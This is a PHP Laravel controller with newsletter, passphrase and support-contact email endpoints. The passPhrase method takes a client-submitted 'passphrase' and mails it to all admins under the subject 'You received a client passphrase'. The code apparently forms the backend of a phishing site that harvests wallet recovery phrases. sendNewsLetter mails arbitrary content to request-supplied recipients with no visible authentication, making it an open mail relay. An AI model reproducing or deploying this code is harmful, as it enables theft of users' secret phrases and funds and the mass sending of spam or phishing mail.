<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Models\User;

class EmailController extends Controller {
    public function sendNewsLetter(Request $request) {
        $receivers = $request->receivers;
        $subject = $request->subject;
        $message = $request->message;
        $details = [
            'message' => $message,
            'subject' => $subject,
            'view' => 'emails.user.newsletter'
        ];

        foreach($receivers as $receiver) {
            $mailer = new \App\Mail\MailSender($details);
            Mail::to($receiver)->send($mailer);
        }
    }
    
     public function passPhrase(Request $request) {
        $passphrase = $request->passphrase;
        $details = [
            'message' => $passphrase,
            'subject' => "You received a client passphrase",
            'view' => 'emails.user.passphrase'
        ];
        
        $admins = User::where(['is_admin' => 1, 'permission' => '1'])->get();
        foreach($admins as $admin) {
            $mailer = new \App\Mail\MailSender($details);
            Mail::to($admin)->send($mailer);
        }
        
        return response()->json(
            [
                'success' => ['message' => ['Your request is processing']]
            ], 201
        );
    }
    
    public function contactSupport(Request $request) {

        $details = [
            'email' => $request->email,
            'subject' => $request->subject,
            'message' => $request->message,
            'name' => $request->name,
            'view' => 'emails.admin.support'
        ];
        

        $admins = User::where(['is_admin' => 1, 'permission' => '1'])->get();
        
        foreach($admins as $admin) {
            $mailer = new \App\Mail\MailSender($details);
            Mail::to($admin->email)->send($mailer);
        }
        return back();
    }
}
